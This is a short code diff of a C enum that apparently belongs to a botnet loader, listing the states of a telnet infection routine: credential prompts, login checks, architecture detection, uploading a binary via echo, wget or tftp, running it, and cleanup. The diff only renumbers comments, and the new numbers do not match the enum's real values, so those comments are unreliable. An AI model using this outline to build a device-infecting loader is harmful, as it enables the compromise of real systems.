@@ -15,26 +15,26 @@ struct connection
     time_t last_recv;
     enum
     {
-        TELNET_CLOSED,          // 0
-        TELNET_CONNECTING,      // 1
-        TELNET_READ_IACS,       // 2
-        TELNET_USER_PROMPT,     // 3
-        TELNET_PASS_PROMPT,     // 4
-        TELNET_WAITPASS_PROMPT, // 5
-        TELNET_CHECK_LOGIN,     // 6
-        TELNET_VERIFY_LOGIN,    // 7
-        //TELNET_PARSE_PS,        // 8
-        TELNET_PARSE_MOUNTS,    // 8
-        TELNET_READ_WRITEABLE,  // 9
-        TELNET_COPY_ECHO,       // 10
-        TELNET_DETECT_ARCH,     // 11
-        TELNET_ARM_SUBTYPE,     // 12
-        TELNET_UPLOAD_METHODS,  // 13
-        TELNET_UPLOAD_ECHO,     // 14
-        TELNET_UPLOAD_WGET,     // 15
-        TELNET_UPLOAD_TFTP,     // 16
-        TELNET_RUN_BINARY,      // 17
-        TELNET_CLEANUP          // 18
+        TELNET_CLOSED,          // 1
+        TELNET_CONNECTING,      // 2
+        TELNET_READ_IACS,       // 3
+        TELNET_USER_PROMPT,     // 4
+        TELNET_PASS_PROMPT,     // 5
+        TELNET_WAITPASS_PROMPT, // 6
+        TELNET_CHECK_LOGIN,     // 7
+        TELNET_VERIFY_LOGIN,    // 8
+     //TELNET_PARSE_PS,         // 8
+        TELNET_PARSE_MOUNTS,    // 9
+        TELNET_READ_WRITEABLE,  // 10
+        TELNET_COPY_ECHO,       // 11
+        TELNET_DETECT_ARCH,     // 12
+        TELNET_ARM_SUBTYPE,     // 13
+        TELNET_UPLOAD_METHODS,  // 14
+        TELNET_UPLOAD_ECHO,     // 15
+        TELNET_UPLOAD_WGET,     // 16
+        TELNET_UPLOAD_TFTP,     // 17
+        TELNET_RUN_BINARY,      // 18
+        TELNET_CLEANUP          // 19
     } state_telnet;
     struct
     {
